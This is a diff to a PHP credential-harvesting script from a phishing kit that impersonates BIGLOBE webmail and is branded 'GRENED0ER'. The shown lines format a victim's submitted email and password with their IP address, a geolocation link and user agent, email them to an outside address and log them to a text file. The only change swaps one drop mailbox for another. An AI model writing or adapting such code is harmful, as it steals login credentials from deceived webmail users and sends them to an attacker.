@@ -16,7 +16,7 @@ if($email != null && $password != null){
 	$message .= "»»————-　★[ 💻🌏 http://www.geoiptool.com/?IP=$ip  🌏💻  ]★　————-««\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "»»————-　★[ 💻🌏 GRENED0ER 🌏💻  ]★　————-««\n";
-	$send = "06mahout_juleps@icloud.com";
+	$send = "gon.rob1288@gmail.com";
 	$subject = "GRENED0ER🌏💻 New BIGLOBEメール｜Webメール  Log Received From: $ip";
     mail($send, $subject, $message);  
 	$save = fopen("Biglobe.txt","a+");
